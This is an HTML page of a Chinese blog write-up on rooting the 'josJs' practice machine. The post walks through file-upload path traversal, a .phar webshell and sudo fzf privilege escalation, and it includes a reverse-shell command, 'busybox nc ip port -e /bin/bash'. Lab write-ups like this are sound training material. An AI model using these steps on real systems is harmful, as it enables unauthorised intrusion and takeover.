@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="userflagnmap扫端口，出80和8080，一次查看发现仅仅是静态网页，而且识别不出是什么语言，于是扫目录 123456780[21:49:16] 200 -    2KB - &#x2F;node_modules&#x2F;                                    [21:49:17] 200 -   66B  - &#x2F;package.json">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机josJs">
+<meta property="og:url" content="https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/index.html">
+<meta property="og:site_name" content="Rufeii">
+<meta property="og:description" content="userflagnmap扫端口，出80和8080，一次查看发现仅仅是静态网页，而且识别不出是什么语言，于是扫目录 123456780[21:49:16] 200 -    2KB - &#x2F;node_modules&#x2F;                                    [21:49:17] 200 -   66B  - &#x2F;package.json">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260312224023800.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260312224718646.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260312225346118.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260312231234965.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260312233045358.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260312235551975.png">
+<meta property="article:published_time" content="2026-03-12T14:29:31.000Z">
+<meta property="article:modified_time" content="2026-03-12T15:58:44.924Z">
+<meta property="article:author" content="Rufeii">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260312224023800.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/website.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/website.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/website.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>靶机josJs</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">ab0ut</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categ0ries</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/03/11/%E9%9D%B6%E6%9C%BADAV/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&text=靶机josJs"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&title=靶机josJs"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&is_video=false&description=靶机josJs"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶机josJs&body=Check out this article: https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&title=靶机josJs"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&title=靶机josJs"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&title=靶机josJs"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&title=靶机josJs"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&name=靶机josJs&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&t=靶机josJs"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#userflag"><span class="toc-number">1.</span> <span class="toc-text">userflag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootflag"><span class="toc-number">2.</span> <span class="toc-text">rootflag</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        靶机josJs
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Rufeii</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-03-12T14:29:31.000Z" class="dt-published" itemprop="datePublished">2026-03-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h2><p>nmap扫端口，出80和8080，一次查看发现仅仅是静态网页，而且识别不出是什么语言，于是扫目录</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">80</span><br><span class="line">[21:49:16] 200 -    2KB - /node<span class="built_in">_</span>modules/                                    </span><br><span class="line">[21:49:17] 200 -   66B  - /package.json                                     </span><br><span class="line">[21:49:17] 200 -   54KB - /package-lock.json</span><br><span class="line"></span><br><span class="line">8080</span><br><span class="line">有个/upload文件上传的服务</span><br></pre></td></tr></table></figure>
+
+<p>那么80端口这3个玩意是是nodejs的核心文件</p>
+<p><img src="/../images/achieve/2026/1/image-20260312224023800.png" alt="image-20260312224023800"></p>
+<p>这里可以看框架是<strong>AdonisJS</strong>：一个 Node.js 全栈 Web 框架。并且暴露了中间件的版本，这里先放在这！然后这是一个web目录，不然怎么可以直接访问文件呢？80端口到这差不多</p>
+<p>8080肯定就是nodejs起的服务了，那么能文件上传而且看到上传的目录</p>
+<p><img src="/../images/achieve/2026/1/image-20260312224718646.png" alt="image-20260312224718646"></p>
+<p>这里我联想到上次浅析的一个js的洞，通过session去目录穿越。</p>
+<p><img src="/../images/achieve/2026/1/image-20260312225346118.png" alt="image-20260312225346118"></p>
+<p><a href="https://rufeii.github.io/2026/02/22/%E6%B5%85%E6%9E%90CVE-2025-61686-ReactRouter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/">浅析CVE-2025-61686-ReactRouter-任意文件写入漏洞</a>  那么我的第一反应并是通过文件名去进行目录穿越，发现ok的！那么随之而来的就是如何去getshell，这里我当时傻了（没结合前面的信息），我就想你nodejs起的服务上传木马也访问不了啊！于是我就去搜文章</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rix4uni/cvemapping/tree/d846c426343beebb3ca1d3fbaaa7545eebccf13e/2026/CVE-2026-21440">CVE-2026-21440</a>不看不知道，一看吓一跳都对应上了，懒得分析了，直接拿来打！但是不行哈！</p>
+<p>于是还是得去分析，发现它其实就是上传木马到web目录，web目录在哪呢？80端口啊XD!!!</p>
+<p>乐呵呵地去上传，文件后缀有黑名单，一顿绕过都不行，知识盲区了，最后得知可以上传phar且可以解析，那就好办了，一个木马上去，不就拿到shell了嘛！</p>
+<p>非交互式的tty，两种办法起交互式tty</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;home&#x2F;welcome需要welcome权限，所以尝试提权，有个sudo可以用，然后mooi给我安利了一个比较好的提权命令查询的网站<a target="_blank" rel="noopener" href="https://gtfobins.org/gtfobins/fzf/">fzf | GTFOBins</a></p>
+<p><img src="/../images/achieve/2026/1/image-20260312231234965.png" alt="image-20260312231234965"></p>
+<p>允许任意用户以 welcome 用户 &#x2F; 用户组的身份（(welcome)），无需密码执行 &#x2F;usr&#x2F;bin&#x2F;fzf</p>
+<p>两种提取命令：</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/fzf --preview &#x27;busybox nc ip port -e /bin/bash&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这个不用怕shell崩，它是会预先执行</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u welcome fzf --bind &#x27;enter:execute(/bin/bash)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这个就对shell有些要求，加固一下，当时比较急mooi直接给了我加固的命令，有个伙伴真的太棒了</p>
+<p>因为我们拿到的是伪交互式tty,ctrl+z之后输入下面命令</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br></pre></td></tr></table></figure>
+
+<p>这个命令是 Unix&#x2F;Linux 终端中<strong>修复伪 TTY 交互体验</strong>的核心命令组合，所以反弹shell在kali进行，我前面win的nc不行然后执行提权命令就ok了</p>
+<p><code>fg</code>就是将后台挂起的进程调回前台</p>
+<p><img src="/../images/achieve/2026/1/image-20260312233045358.png" alt="image-20260312233045358"></p>
+<h2 id="rootflag"><a href="#rootflag" class="headerlink" title="rootflag"></a>rootflag</h2><p>复现：</p>
+<p>jorJs的root部分给个提示:journalctl</p>
+<p>是一个查看日志的命令</p>
+<p><img src="/../images/achieve/2026/1/image-20260312235551975.png" alt="image-20260312235551975"></p>
+<p>MazeSec-journalctl-AdonisJS就是提权的密码，哈哈哈！</p>
+<p>过程：现在看了简单哦，但是打可是花了我不少时间，冷静思考，不断复盘，持续进步！</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/about/">ab0ut</a></li>
+        
+          <li><a href="/categories/">categ0ries</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#userflag"><span class="toc-number">1.</span> <span class="toc-text">userflag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootflag"><span class="toc-number">2.</span> <span class="toc-text">rootflag</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&text=靶机josJs"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&title=靶机josJs"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&is_video=false&description=靶机josJs"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶机josJs&body=Check out this article: https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&title=靶机josJs"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&title=靶机josJs"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&title=靶机josJs"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&title=靶机josJs"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&name=靶机josJs&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/03/12/%E9%9D%B6%E6%9C%BAjosJs/&t=靶机josJs"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025-2026
+    Rufeii
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="/">h0me</a></li><li><a href="/about/">ab0ut</a></li><li><a href="/categories/">categ0ries</a></li><li><a href="/tags/">tags</a></li><li><a href="/links/">links</a></li><li><a href="/search/">Search</a></li>
+      </ul>
+      <ul>
+            
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              
+            
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</body>
+</html>
